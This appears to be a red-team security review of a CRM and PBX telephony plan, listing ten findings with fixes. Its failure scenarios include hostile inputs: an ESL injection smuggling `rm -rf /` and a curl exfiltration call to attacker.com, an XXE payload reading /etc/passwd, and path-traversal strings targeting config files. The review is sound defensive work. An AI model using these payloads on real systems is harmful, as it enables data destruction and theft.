# Red Team Review: Security Adversary Perspective

**Plan:** CRM Omnichannel Phase 1 MVP
**Date:** 2026-03-24
**Reviewer:** code-reviewer (security adversary mode)
**Scope:** All 9 phases, focusing on auth bypass, injection, data exposure, privilege escalation, supply chain, OWASP Top 10

---

## Finding 1: ESL Command Injection via Unsanitized Originate Parameters

- **Severity:** Critical
- **Location:** Phase 04, section "ESL Service", step 3.1
- **Flaw:** The originate command is built via string interpolation: `bgapi originate {origination_caller_id_number=XXX}sofia/internal/${agentExt}@${domain} &bridge(sofia/gateway/${gateway}/${dest})`. The `destinationNumber` and `agentExtension` values are interpolated directly into a FreeSWITCH command string. There is no mention of sanitizing these inputs against ESL metacharacters or shell-like injection.
- **Failure scenario:** An attacker with agent credentials sends `POST /calls/originate` with `phoneNumber` set to `1234} &system(rm -rf /) {` or `1234%0Aapi system curl attacker.com/exfil?data=$(cat /etc/freeswitch/autoload_configs/switch.conf.xml)`. FreeSWITCH ESL commands are newline-delimited; injecting newlines or ESL control characters could execute arbitrary FreeSWITCH API commands, including `system` which runs OS shell commands on the PBX server.
- **Evidence:** Phase 04 step 3.1 shows raw interpolation: `bgapi originate ... ${dest}`. Phase 03 mentions Zod validation but Phase 04's call schemas are not listed in shared validation files. No ESL-specific input sanitization is mentioned anywhere.
- **Suggested fix:** (1) Strict regex whitelist on phone numbers (digits, +, max 15 chars per E.164). (2) Escape or reject any ESL control characters (`\n`, `{`, `}`, `&`, single quotes). (3) Add `packages/shared/src/validation/call-schemas.ts` with phone number validation. (4) Never interpolate user input into ESL commands without sanitization -- use a builder function that rejects invalid chars.

---

## Finding 2: CDR Webhook IP Whitelist Bypass via X-Forwarded-For

- **Severity:** Critical
- **Location:** Phase 04, section "CDR Webhook", step 6.2; Phase 09, section "Security hardening", step 1.7
- **Flaw:** The plan specifies "IP whitelist (FusionPBX IP)" for the CDR webhook but does not specify how the client IP is determined. If the app sits behind a reverse proxy (Nginx, as specified in Phase 09 Docker setup), `req.ip` may reflect the proxy IP unless `trust proxy` is configured correctly. Conversely, if `trust proxy` is set too broadly, an attacker can spoof `X-Forwarded-For` to bypass the whitelist entirely.
- **Failure scenario:** Attacker sends `POST /webhooks/cdr` with header `X-Forwarded-For: <FusionPBX-IP>` and a crafted XML CDR body. The webhook trusts the spoofed IP, processes the payload, and inserts fabricated call records into call_logs. This poisons reporting data, creates phantom call records, and could be used to frame agents or manipulate KPIs.
- **Evidence:** Phase 04 step 6.2: "IP whitelist (FusionPBX IP) + Basic Auth header check". Phase 09 step 4: Nginx fronts the backend. No mention of `trust proxy` configuration or how IP is extracted.
- **Suggested fix:** (1) Document explicit `app.set('trust proxy', 1)` (trust only one hop -- the Nginx proxy). (2) Validate `req.ip` not `req.headers['x-forwarded-for']`. (3) In Docker compose, ensure the webhook endpoint is on an internal network path that external traffic cannot reach, or use mTLS between FusionPBX and CRM.

---

## Finding 3: Refresh Token Race Condition Enables Token Reuse

- **Severity:** High
- **Location:** Phase 02, section "Risk Assessment"
- **Flaw:** The plan acknowledges the race condition ("two parallel refresh requests could both succeed") and suggests "Redis atomic operations" as mitigation, but provides no concrete design. The implementation steps (step 5.2) say "validate refresh token, rotate, return new pair" without specifying atomicity. Without a proper design, the implementer will likely write a non-atomic read-then-delete pattern.
- **Failure scenario:** Attacker intercepts a refresh token (e.g., via XSS on a subdomain reading the cookie, or a shared machine). They fire 100 concurrent refresh requests. Due to the read-validate-delete race window, multiple requests succeed before the token is invalidated. The attacker now has multiple valid access/refresh token pairs. Even after the legitimate user's session rotates, the attacker retains access.
- **Evidence:** Phase 02 Risk Assessment: "Token rotation race condition: two parallel refresh requests could both succeed. Mitigate with Redis atomic operations." No implementation detail follows -- steps 5.1-5.2 are silent on atomicity.
- **Suggested fix:** Specify a concrete design: use Redis `GETDEL` (atomic get-and-delete) or a Lua script that atomically checks, deletes, and returns the token. If the token is already deleted, the refresh fails. Document this in the implementation steps, not just the risk section.

---

## Finding 4: No CSRF Protection on Cookie-Based Auth

- **Severity:** High
- **Location:** Phase 02, section "Security Considerations"; Phase 08, section "Security Considerations"
- **Flaw:** Refresh tokens are stored as httpOnly cookies. The plan mentions `sameSite` but does not specify its value. If `sameSite=Lax` (browser default), the refresh endpoint is still vulnerable to CSRF via top-level navigation (GET redirects). If `sameSite=None` (needed for cross-origin), it is fully CSRF-vulnerable. No CSRF token mechanism is mentioned anywhere.
- **Failure scenario:** Attacker hosts `<img src="https://crm.example.com/auth/refresh">` or a form that POSTs to `/auth/refresh`. If the victim visits the attacker's page while logged in, the browser sends the httpOnly cookie. The attacker page receives a new access token in the response body (if the response is readable, e.g., via CORS misconfiguration or if the endpoint returns JSON that can be read via script injection). Even without reading the response, the server-side token rotation occurs, potentially invalidating the victim's real session (denial of service).
- **Evidence:** Phase 02 Security Considerations: "Refresh token stored as httpOnly, secure, sameSite cookie" -- no sameSite value specified. No mention of CSRF tokens in any phase. Phase 09 mentions CORS whitelist but not CSRF.
- **Suggested fix:** (1) Set `sameSite=Strict` for the refresh cookie. (2) Require the access token (from memory) in the Authorization header on the `/auth/refresh` endpoint as a CSRF proof -- if the attacker cannot read the access token, they cannot call refresh. (3) Alternatively, add a CSRF token bound to the session.

---

## Finding 5: XML External Entity (XXE) Injection in CDR Webhook

- **Severity:** High
- **Location:** Phase 04, section "CDR Webhook", step 6.3
- **Flaw:** The CDR webhook receives XML from FusionPBX and parses it with `fast-xml-parser`. The plan does not mention disabling external entity resolution or DTD processing. Even though the source is supposedly trusted (FusionPBX), the IP whitelist is bypassable (Finding 2), meaning an attacker could send crafted XML.
- **Failure scenario:** Attacker bypasses IP whitelist (Finding 2) and sends: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><cdr><caller>&xxe;</caller></cdr>`. If the parser resolves external entities, the server reads local files and stores their contents in call_logs or returns them in error messages. This leads to server-side file disclosure (database credentials, JWT secrets from .env).
- **Evidence:** Phase 04 step 6.3: "Parse XML body (use `fast-xml-parser`)" -- no mention of XXE prevention settings.
- **Suggested fix:** (1) Configure fast-xml-parser with `processEntities: false` and `allowBooleanAttributes: false`. (2) Explicitly document XXE prevention in Phase 04 security considerations. (3) Validate the XML structure matches expected CDR schema before processing.

---

## Finding 6: Recording Proxy SSRF via Path Traversal

- **Severity:** High
- **Location:** Phase 04, section "Recording proxy", step 7.3
- **Flaw:** The recording proxy fetches from `http://FUSIONPBX_IP:8088/recordings/{domain}/{file}` where the file path comes from the `recording_path` field in call_logs. If an attacker can influence recording_path (via crafted CDR webhook data -- see Finding 2), they can inject path traversal sequences to make the CRM backend fetch arbitrary files from the FusionPBX server or internal network.
- **Failure scenario:** Attacker injects a CDR with `recording_path` set to `../../autoload_configs/switch.conf.xml` or `../../../../etc/freeswitch/vars.xml`. An admin or QA user clicks "play recording" for this call log. The CRM backend proxies `http://FUSIONPBX:8088/recordings/domain/../../autoload_configs/switch.conf.xml`, potentially exposing FreeSWITCH configuration files including passwords and internal topology.
- **Evidence:** Phase 04 step 7.3: "Proxy request to `http://FUSIONPBX_IP:8088/recordings/{domain}/{file}`". No path validation or sanitization mentioned. Recording_path populated from CDR webhook (step 6.4).
- **Suggested fix:** (1) Validate recording_path against a strict regex (alphanumeric + limited chars, no `..`, no `/` except expected separators). (2) Use `path.resolve()` and verify the resulting path stays within the recordings directory. (3) Only allow `.wav` and `.mp3` extensions.

---

## Finding 7: Seed Credentials Shipped to Production

- **Severity:** High
- **Location:** Phase 02, section "Implementation Steps", step 9.1
- **Flaw:** The plan seeds `admin@crm.local / changeme123` and provides no mechanism to force a password change on first login or prevent the seed from running in production. The seed script is in `prisma/seed.ts` which typically runs on `prisma migrate deploy` or can be triggered by `prisma db seed`.
- **Failure scenario:** Developer runs `prisma db seed` in production (common during initial deployment). The admin@crm.local account exists with a known password. An attacker who knows this plan (it is in the git repo) logs in as admin immediately after deployment, gains full system access, exfiltrates all customer data (PII, phone numbers, debt records), and creates backdoor accounts.
- **Evidence:** Phase 02 step 9.1: "Admin user: admin@crm.local / changeme123". No mention of: force-change-on-first-login flag, environment guard on seed script, or separate seed for dev vs production.
- **Suggested fix:** (1) Seed script must check `NODE_ENV` and refuse to create default credentials in production. (2) Add a `must_change_password` flag on the user model, enforce on login. (3) Production admin setup should use a CLI command that prompts for credentials interactively or reads from env vars.

---

## Finding 8: Client-Side RBAC Without Server Enforcement Verification

- **Severity:** Medium
- **Location:** Phase 08, section "Security Considerations"
- **Flaw:** Phase 08 states "RBAC reflected in UI: hide buttons/menu items user can't access" and "API client strips sensitive fields before displaying." This implies the frontend hides UI elements but does not mention verifying that EVERY backend endpoint has the corresponding RBAC middleware. The plan's Phase 09 testing section lists "RBAC: admin can create users, agent cannot" but only as one test case, not systematic endpoint coverage.
- **Failure scenario:** A developer implements a new endpoint (e.g., `POST /campaigns/:id/assign`) and forgets to add `requireRole('admin', 'manager')` middleware. The UI hides the button for agents, but an agent who inspects network traffic can call the endpoint directly and assign contacts to themselves from other agents' campaigns, stealing leads or debt cases.
- **Evidence:** Phase 08 Security: "RBAC reflected in UI (hide unauthorized elements)". Phase 09 step 3: only one RBAC test example. No mention of a systematic RBAC audit or middleware-coverage check.
- **Suggested fix:** (1) Add a test that iterates ALL registered routes and verifies each has `authMiddleware` + `rbacMiddleware` (except explicitly public routes). (2) Use a route registration pattern that requires roles as a mandatory parameter, making it impossible to forget. (3) Document which roles can access which endpoints in a matrix table.

---

## Finding 9: Data Scope Bypass via Direct ID Access

- **Severity:** High
- **Location:** Phase 02, section "Data scope middleware", step 4; Phase 03/05/06 CRUD endpoints
- **Flaw:** The `dataScopeMiddleware` adds a `where` clause for list queries (GET /contacts, GET /leads, etc.). However, the plan does not specify that the same scope check is applied to individual resource access (GET /contacts/:id, PATCH /contacts/:id, DELETE /contacts/:id). If the middleware only filters list queries, an agent who knows another agent's contact ID can directly access, modify, or delete it.
- **Failure scenario:** Agent A is assigned contact #100. Agent B guesses or discovers the ID (sequential IDs make this trivial). Agent B calls `GET /contacts/100` and receives full contact details including PII (phone, ID number, debt information). Agent B calls `PATCH /contacts/100` and reassigns the contact to themselves. The dataScopeMiddleware only filtered the list endpoint.
- **Evidence:** Phase 02 step 4: "Attaches `req.dataScope` object for services to use in Prisma `where`" -- implies list filtering. Phase 03 step 3.3: "GET /contacts/:id -- detail with relationships" -- no mention of scope check. No explicit statement that individual resource access is scoped.
- **Suggested fix:** (1) Explicitly state in Phase 02 that dataScopeMiddleware MUST be applied to all CRUD operations, not just list. (2) For single-resource endpoints, the service must include the dataScope in the Prisma `where` clause (e.g., `where: { id, ...dataScope }`). (3) Add integration tests for IDOR on every entity: agent A cannot GET/PATCH/DELETE agent B's resources.

---

## Finding 10: No Encryption at Rest for PII and Debt Data

- **Severity:** Medium
- **Location:** Phase 03, section "Security Considerations"; Phase 09, section "Docker production setup"
- **Flaw:** The CRM stores highly sensitive PII: phone numbers, national ID numbers (`id_number`), debt amounts, promise-to-pay records. The plan mentions no encryption at rest for the PostgreSQL database or Redis cache. Docker Compose uses a plain volume for PostgreSQL.
- **Failure scenario:** An attacker gains read access to the Docker volume (host compromise, backup exposure, or cloud storage misconfiguration). They read the PostgreSQL data files directly, bypassing all application-level RBAC, and exfiltrate all customer PII and debt records. In Vietnam's regulatory context, this is a data protection violation.
- **Evidence:** Phase 03 Security: mentions only Zod validation, Prisma parameterized queries, MIME validation, and RBAC. Phase 09 step 4: "postgres:15 with volume" -- no mention of encryption. No mention of column-level encryption for `id_number` or sensitive fields.
- **Suggested fix:** (1) Enable PostgreSQL TDE or use LUKS-encrypted Docker volumes. (2) Encrypt sensitive columns (`id_number`, phone numbers) at the application level using a key from a secrets manager. (3) Encrypt Redis persistence (RDB/AOF) or disable persistence for cache-only data. (4) Document data classification and encryption requirements.

---

## Unresolved Questions

1. Is the ESL password the same as the default FreeSWITCH `ClueCon` password? If so, any attacker on the internal network can control the PBX.
2. What happens when Redis goes down? The plan uses Redis for refresh tokens, rate limiting, active calls, and agent status. A Redis outage could simultaneously disable auth, rate limiting, and call management -- creating a window where rate limits are unenforced.
3. The `packages/shared` directory is used by both frontend and backend. If a malicious dependency is introduced via npm (supply chain), it executes in both environments. No mention of `npm audit`, lockfile integrity checks, or dependency pinning.
4. QA annotations are "immutable after 24h" but implemented via "service logic." What prevents a direct database update bypassing the service? No DB-level constraint is mentioned.
5. The Socket.IO JWT auth happens "on connection" but are subsequent messages authenticated? A long-lived connection could outlive the JWT expiry, allowing an agent who was deactivated to continue receiving real-time data.
